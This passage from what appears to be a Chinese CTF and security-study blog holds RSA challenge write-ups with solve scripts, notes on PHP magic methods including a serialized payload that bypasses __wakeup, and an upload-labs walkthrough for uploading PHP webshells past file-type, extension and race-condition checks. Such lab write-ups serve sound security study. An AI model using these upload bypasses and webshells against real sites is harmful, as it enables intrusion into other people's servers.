builtin">pow</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="羊城杯-2021-Bigrsa"><a href="#羊城杯-2021-Bigrsa" class="headerlink" title="[羊城杯 2021]Bigrsa"></a>[羊城杯 2021]Bigrsa</h1><p>打开附件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> flag <span class="token keyword">import</span> <span class="token operator">*</span>n1 <span class="token operator">=</span> <span class="token number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span>n2 <span class="token operator">=</span> <span class="token number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span>e <span class="token operator">=</span> <span class="token number">65537</span>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n1<span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c = %d"</span> <span class="token operator">%</span> c<span class="token punctuation">)</span><span class="token comment"># output</span><span class="token comment"># c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">n是模  e是公钥  c是密文  m是明文  d是私钥<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>已知的是两个模n1n2，公钥e和密文c</li></ul><p>根据两个模求得p和q（p😭q）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 求两个模的最大公约数</span>p <span class="token operator">=</span> GCD<span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token comment"># 求q1和q2</span>q1 <span class="token operator">=</span> n1 <span class="token operator">//</span> pq2 <span class="token operator">=</span> n2 <span class="token operator">//</span> p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由此可得欧拉函数的值</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 求欧拉函数值</span>_n1 <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>_n2 <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>再求得私钥</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 求私钥</span>d1 <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span> _n1<span class="token punctuation">)</span>d2 <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span> _n2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>因为明文是先后分两次加密的，所以先用d2解</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d2<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> d1<span class="token punctuation">,</span> n1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>最后转换一下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最终payload</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>n1 <span class="token operator">=</span> <span class="token number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span>n2 <span class="token operator">=</span> <span class="token number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span>e <span class="token operator">=</span> <span class="token number">65537</span>c <span class="token operator">=</span> <span class="token number">60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span><span class="token comment"># 求两个模的最大公约数</span>p <span class="token operator">=</span> GCD<span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token comment"># 求q1和q2</span>q1 <span class="token operator">=</span> n1 <span class="token operator">//</span> pq2 <span class="token operator">=</span> n2 <span class="token operator">//</span> p<span class="token comment"># 求欧拉函数值</span>_n1 <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>_n2 <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># 求私钥</span>d1 <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span> _n1<span class="token punctuation">)</span>d2 <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span> _n2<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>d2<span class="token punctuation">)</span><span class="token punctuation">,</span> n2<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> d1<span class="token punctuation">,</span> n1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="GWCTF-2019-babyRSA"><a href="#GWCTF-2019-babyRSA" class="headerlink" title="[GWCTF 2019]babyRSA"></a>[GWCTF 2019]babyRSA</h1><p>先通过N求p和q</p><blockquote><p>因为p和q极为接近所以直接开方取得p再用<code>gmpy2.next_prime</code>函数取值即可</p></blockquote><p>计算得到私钥d后，先求得c1c2，然后有：</p><blockquote><p>c1 &#x3D; F1 + F2</p><p>c2 &#x3D; F1^3 + F2^3</p><p>由此可得：</p><p>3 * c1 * F1^2 - 3 * c1^2 * F1 - c2 + c1^3 &#x3D; 0</p></blockquote><p>解方程即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> sympy <span class="token keyword">import</span> solve<span class="token keyword">from</span> sympy<span class="token punctuation">.</span>abc <span class="token keyword">import</span> xN<span class="token operator">=</span><span class="token number">636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163</span>m1<span class="token operator">=</span><span class="token number">90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239</span>m2<span class="token operator">=</span><span class="token number">487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546</span>e<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">0x10001</span><span class="token punctuation">)</span>p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>N<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>q <span class="token operator">=</span> N <span class="token operator">//</span> pphi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> phi<span class="token punctuation">)</span>c1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m1<span class="token punctuation">,</span> d<span class="token punctuation">,</span> N<span class="token punctuation">)</span>  <span class="token comment"># c1 = F1+F2 </span>c2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m2<span class="token punctuation">,</span> d<span class="token punctuation">,</span> N<span class="token punctuation">)</span>  <span class="token comment"># c2 = F1^3+F2^3 = (F1+F2)(F1^2+F1*F2+F2^2) = c1(F1^2+F1*F2+F2^2)</span><span class="token comment"># 3 * c1 * F1^2 - 3 * c1^2 * F1 - c2 + c1^3 = 0</span>res <span class="token operator">=</span> solve<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>c1<span class="token operator">*</span><span class="token builtin">pow</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3</span><span class="token operator">*</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span>x<span class="token operator">-</span>c2<span class="token operator">+</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span>F2 <span class="token operator">=</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>F1 <span class="token operator">=</span> c1 <span class="token operator">-</span> F2m <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>F1<span class="token punctuation">)</span> <span class="token operator">+</span> long_to_bytes<span class="token punctuation">(</span>F2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Crypot </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP中常用的魔术方法</title>
      <link href="/2023/09/21/PHP%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"/>
      <url>/2023/09/21/PHP%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h2><p><strong>执行unserialize()时，先会调用这个函数</strong></p><p><code>unserialize()</code> 会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup</code> 方法，预先准备对象需要的资源。</p><p>如何绕过wakeup函数：只要反序列化时对象参数大于原参数数量即可绕过,例如</p><pre class="line-numbers language-none"><code class="language-none">我们只需要把对象原来属性值比原来的大就行我们把1改成2修改前:O:6:“sercet”:1:&#123;s:12:“%00sercet%00file”;s:8:“flag.php”;&#125;修改后:O:6:“sercet”:2:&#123;s:12:“%00sercet%00file”;s:8:“flag.php”;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="destruct"><a href="#destruct" class="headerlink" title="__destruct"></a>__destruct</h2><p><strong>这是析构函数，脚本运行结束之前会调用对象的析构函数</strong></p><h2 id="construct"><a href="#construct" class="headerlink" title="__construct"></a>__construct</h2><p><strong>这是构造函数，当使用 new 关键字实例化一个对象时，构造函数将会自动调用</strong></p><h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h2><p><strong>将当前类的类名当作变量时自动调用</strong></p><p>此方法必须返回一个字符串，否则将发出一条 <code>E_RECOVERABLE_ERROR</code> 级别的致命错误。</p><ul><li>对一个对象进行echo操作或者print操作会触发__toString;</li><li>声明的变量赋值为对象后与字符串做弱类型比较的时候就能触发__toString;</li><li>声明的变量赋值为对象后进行正则匹配的时候就能触发__toString;</li><li>声明的变量被赋值为对象后进行strolower的时候就能触发__toString;</li></ul><h2 id="call"><a href="#call" class="headerlink" title="__call"></a>__call</h2><p><strong>在对象中调用一个不存在的方法时自动调用</strong></p><p>当程序发现对象没有定义某个方法时，就会尝试调用名为<code>__call</code>的方法，如果对象中有<code>__call</code>方法，则会调用<code>__call</code>方法，把不存在的方法名和参数，以数组的形式传递给<code>__call</code>方法。</p><h2 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h2><p><strong>访问类中的私有成员时，如果定义了此方法，自动调用</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Person</span><span class="token punctuation">&#123;</span><span class="token comment">/*封装私有成员属性*/</span><span class="token keyword">private</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string single-quoted-string">'张三'</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string single-quoted-string">'男'</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">;</span><span class="token comment">/*__get()方法用来获取私有属性*/</span><span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$property_name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'在直接获取私有成员属性得时候，自动调用了这个__get()方法&lt;br/>'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$property_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$property_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$p1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*直接获取私有属性得值，会自动调用__get()的方法，返回成员属性的值*/</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'姓名：'</span><span class="token operator">.</span><span class="token variable">$p1</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'性别：'</span><span class="token operator">.</span><span class="token variable">$p1</span><span class="token operator">-></span><span class="token property">sex</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'年龄：'</span><span class="token operator">.</span><span class="token variable">$p1</span><span class="token operator">-></span><span class="token property">age</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h2><p><strong>给一个未定义的属性赋值时，此方法会被触发</strong></p><p>传递的参数是被设置的属性名和值。</p><h2 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h2><p><strong>调用对象名当方法使用时，自动调用</strong></p><p>实例：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">autofelix</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'你还想调用我?'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">autofelix</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//对象直接当函数调用</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//结果: 你还想调用我?</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 魔术方法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload-labs 1-20Pass</title>
      <link href="/2023/09/20/upload-labs%201-20Pass/"/>
      <url>/2023/09/20/upload-labs%201-20Pass/</url>
      
        <content type="html"><![CDATA[<p>本文使用的版本</p><p><img src="https://imag.keyblue.cn/imag/202309201252390.png" alt="image-20230920125230345"></p><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>这一关只在前端对文件进行检查</p><p>上传前先将木马文件更改后缀为jpg，然后使用burp拦截</p><p><img src="https://imag.keyblue.cn/imag/202309061453074.png" alt="image-20230906145315039"></p><p>然后将1.jpg改名为1.php后上传</p><p><img src="https://imag.keyblue.cn/imag/202309061454016.png" alt="image-20230906145428980"></p><p>使用蚁剑连接</p><p><img src="https://imag.keyblue.cn/imag/202309061455745.png" alt="image-20230906145549715"></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>先清除上传文件</p><p>这一关是MIME类型绕过，只要将Content-Type的参数改为image&#x2F;jpeg绕过</p><p><img src="https://imag.keyblue.cn/imag/202309061502388.png" alt="image-20230906150227360"></p><p>使用蚁剑连接成功</p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>先清除上传文件</p><p>先上传1.php，发现被拦截了</p><p><img src="https://imag.keyblue.cn/imag/202309061507161.png" alt="image-20230906150726144"></p><p>可以被php解析的文件后缀</p><pre class="line-numbers language-none"><code class="language-none">php3，php5，pht，phtml，phps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把文件后缀改为php3后上传，需要注意的是，这一关把上传的文件重命名了，我们再burp拦截请求即可看到新的文件名。</p><p><img src="https://imag.keyblue.cn/imag/202309061520169.png" alt="image-20230906152033143"></p><p>最后使用蚁剑连接成功</p><p><img src="https://imag.keyblue.cn/imag/202309061518283.png" alt="image-20230906151837254"></p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>测试了很多后缀都不行，最后在后缀后再加一个解释器无法识别的后缀，成功上传</p><p><img src="https://imag.keyblue.cn/imag/202309061543506.png" alt="image-20230906154346478"></p><p>使用蚁剑连接成功</p><p><img src="https://imag.keyblue.cn/imag/202309061544860.png" alt="image-20230906154429830"></p><p><strong>这一关真正的源码与源码提示不一致！</strong></p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>成功上传a.txt，说明这一关并没有对文件头和文件类型做检查，这样就要再后缀名上下手了</p><p><img src="https://imag.keyblue.cn/imag/202309061600679.png" alt="image-20230906160037654"></p><p>上传a.php.j</p><p><img src="https://imag.keyblue.cn/imag/202309061601596.png" alt="image-20230906160159573"></p><p>可以看到文件被重命名了，php后缀被删除</p><p><img src="https://imag.keyblue.cn/imag/202309061602774.png" alt="image-20230906160254750"></p><p>分析源码，发现没有将后缀转换为小写，随即上传1.PHP</p><p><img src="https://imag.keyblue.cn/imag/202309161105957.png" alt="image-20230916110556922"></p><p>拦截到访问该图片的请求，直接用蚁剑连接成功。</p><p><img src="https://imag.keyblue.cn/imag/202309161107878.png" alt="image-20230916110715856"></p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>观察源码，发现没有对空格过滤，随即上传成功</p><p><img src="https://imag.keyblue.cn/imag/202309161124934.png" alt="image-20230916112415911"></p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>观察源码，发现源码没有对文件进行重命名，随即使用多重后缀上传</p><p><img src="https://imag.keyblue.cn/imag/202309161142881.png" alt="image-20230916114216844"></p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>观察源码发现没有过滤<code>::DATA</code>，随即上传</p><p><img src="https://imag.keyblue.cn/imag/202309161153982.png" alt="image-20230916115318935"></p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p>deldot() 函数从末尾向前检测，检测到第一个点后，会继续向前检测，但遇到空格或字符会停下来</p><p><img src="https://imag.keyblue.cn/imag/202309181520090.png" alt="image-20230918152032038"></p><p>程序去掉点后的文件名为<code>1.php. </code>，保存后文件名变为<code>1.php</code></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>上传<code>1.php</code>测试，上传成功</p><p><img src="https://imag.keyblue.cn/imag/202309181553958.png" alt="image-20230918155317916"></p><p>但是php后缀被替换为空值</p><p><img src="https://imag.keyblue.cn/imag/202309181552907.png" alt="image-20230918155249876"></p><p>随即双写绕过</p><p><img src="https://imag.keyblue.cn/imag/202309181555092.png" alt="image-20230918155523050"></p><p>文件也正常保存了</p><p><img src="https://imag.keyblue.cn/imag/202309181555717.png" alt="image-20230918155554681"></p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>观察源代码</p><p><img src="https://imag.keyblue.cn/imag/202309181603752.png" alt="image-20230918160321712"></p><p>注意到：</p><p>strrpos函数计算<code>.</code>最后一次出现的位置，substr截取<code>.</code>之后的字符串</p><p>再通过in_array函数判断<code>.</code>后的字符串是否在白名单里，只有在白名单里的文件后缀才能通过，程序最后还会对文件进行重命名</p><p>注意到get传参<code>save_path</code>，可使用%00隔断，意思就是直接使用get去传文件名，因为文件的最终名称拼接而成的，改变<code>save_path</code>参数加上%00即可控制文件名称，</p><p><img src="https://imag.keyblue.cn/imag/202309181643165.png" alt="image-20230918164336123"></p><p>%00的作用是阻止函数继续读取</p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>这题和上一题一样，不过GET传值变成了POST传值</p><p><img src="https://imag.keyblue.cn/imag/202309181708214.png" alt="image-20230918170831165"></p><p>需要注意的是，需要将该路径进行url解码后才能发出，不然会上传失败</p><p><img src="https://imag.keyblue.cn/imag/202309181711251.png" alt="image-20230918171141208"></p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>JPG</p><p>该pass检查文件头，用copy命令整合的jpg图片马可以轻松上传，</p><p><img src="https://imag.keyblue.cn/imag/202309181729394.png" alt="image-20230918172958343"></p><p>结合靶场提供的文件包含测试，可以看到恶意代码被执行了</p><p>GIF</p><p><img src="https://imag.keyblue.cn/imag/202309181822466.png" alt="image-20230918182207420"></p><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p>同上即可</p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>同上即可</p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>这一关对图片进行了二次渲染，前面pass的图片马中的恶意代码会被覆盖掉，所以必须将恶意代码放在不会被覆盖的位置</p><p>先上传原图，然后将二次渲染的图保存下来，使用010与原图比较，在蓝色的匹配区域插入恶意代码</p><p><img src="https://imag.keyblue.cn/imag/202309181907321.png" alt="image-20230918190749268"></p><p>上传更改后的文件</p><p><img src="https://imag.keyblue.cn/imag/202309181909805.png" alt="image-20230918190947760"></p><p>上传后尝试包含</p><p><img src="https://imag.keyblue.cn/imag/202309181908305.png" alt="image-20230918190838273"></p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>对该pass进行源码审计，发现不论文件名是什么都会在upload目录下存在过，这是典型的条件竞争</p><p>新建一个测试器上传1.php，内容是保存一个新的脚本文件，因为旧的文件只会存在很短的时间。</p><p>然后随便添加一个get传参，名称无所谓，参数也无所谓，只要次数足够。</p><p><img src="https://imag.keyblue.cn/imag/202309201016383.png" alt="image-20230920101615338"></p><p>再新建一个测试访问1.php，目的是执行1.php</p><p>然后随便添加一个get传参，名称无所谓，参数也无所谓，只要次数足够。当这个返回值出现200时，说明执行成功，届时就可以访问phpinfo.php</p><p><img src="https://imag.keyblue.cn/imag/202309201024906.png" alt="image-20230920102427863"></p><p>将载荷都设置成下图所示</p><p><img src="https://imag.keyblue.cn/imag/202309201026881.png" alt="image-20230920102622843"></p><p>依次开启测试，查看访问1.php的测试，我们发现已经返回200，说明phpinfo.php已经成功创建。</p><p><img src="https://imag.keyblue.cn/imag/202309201028238.png" alt="image-20230920102819204"></p><p>访问测试</p><p><img src="https://imag.keyblue.cn/imag/202309201029024.png" alt="image-20230920102900994"></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" 